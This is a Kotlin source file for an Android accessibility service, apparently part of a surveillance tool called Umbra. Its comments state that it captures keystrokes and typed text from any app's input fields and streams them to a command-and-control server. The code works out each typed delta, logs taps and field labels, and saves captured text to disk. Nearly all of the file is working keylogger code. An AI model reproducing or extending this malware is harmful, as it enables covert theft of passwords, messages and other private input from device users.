package org.umbra.core.modules

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * AccessibilityService that captures keystrokes and typed text from any app's
 * input fields, feeding them to KeylogModule for buffering + real-time
 * streaming to the C2 server.
 *
 * MUST be manually enabled by user in:
 * Settings → Accessibility → Umbra Keylogger
 *
 * Event handling:
 *  - TYPE_VIEW_TEXT_CHANGED: fires on every edit of a focused text field.
 *    We diff against the previously-seen field text (and event.beforeText) to
 *    extract exactly what was just typed, then stream that delta.
 *  - TYPE_WINDOW_CONTENT_CHANGED: used to detect focus/field switches so we
 *    reset per-field tracking (and occasionally capture the field label).
 */
class UmbraAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Umbra.Accessibility"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        KeylogModule.hasActiveSession = true
        Log.d(TAG, "Accessibility service connected — keylogger active")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event, packageName)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowChanged(event, packageName)
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text?.joinToString(" ") ?: ""
                if (text.isNotBlank()) {
                    KeylogModule.onKeyEvent(packageName, "[TAP] $text")
                }
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent, packageName: String) {
        // Full text currently in the field (may be masked for password fields).
        val fullText = event.text?.joinToString(" ") ?: ""
        val beforeText = event.beforeText?.toString() ?: ""

        // Determine what was just typed.
        val delta: String? = when {
            beforeText.isNotEmpty() && fullText != beforeText -> {
                // Android 9+ provides the pre-change text directly.
                diffDelta(beforeText, fullText)
            }
            else -> KeylogModule.computeTypedDelta(packageName, fullText)
        }

        // Always record the full field text into the buffer (context for dump),
        // and stream the keystroke delta in real-time.
        if (fullText.isNotBlank()) {
            KeylogModule.onKeyEvent(packageName, fullText)
        }
        if (delta != null && delta.isNotBlank()) {
            KeylogModule.onKeystroke(packageName, delta)
        }
    }

    private fun handleWindowChanged(event: AccessibilityEvent, packageName: String) {
        // Occasionally a field label/placeholder is exposed here — capture it as
        // a context marker rather than a keystroke.
        val text = event.text?.joinToString(" ") ?: ""
        if (text.isNotBlank() && text.length <= 80) {
            KeylogModule.onKeyEvent(packageName, "[FIELD] $text")
        }
    }

    /**
     * Computes the inserted text (or a backspace marker) between two strings.
     */
    private fun diffDelta(before: String, after: String): String? {
        if (before == after) return null
        var i = 0
        while (i < before.length && i < after.length && before[i] == after[i]) i++
        val beforeSuffix = before.length - i
        val afterSuffix = after.length - i
        var s = 0
        while (s < beforeSuffix && s < afterSuffix &&
            before[before.length - 1 - s] == after[after.length - 1 - s]) s++
        val removed = before.substring(i, before.length - s)
        val added = after.substring(i, after.length - s)
        return when {
            added.isNotEmpty() && removed.isEmpty() -> added
            added.isEmpty() && removed.isNotEmpty() -> "\u232B".repeat(removed.length)
            added.isNotEmpty() && removed.isNotEmpty() -> "\u232B${removed.length}$added"
            else -> null
        }
    }

    override fun onInterrupt() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        super.onDestroy()
        Log.d(TAG, "Accessibility service destroyed — keylogger stopped")
    }
}
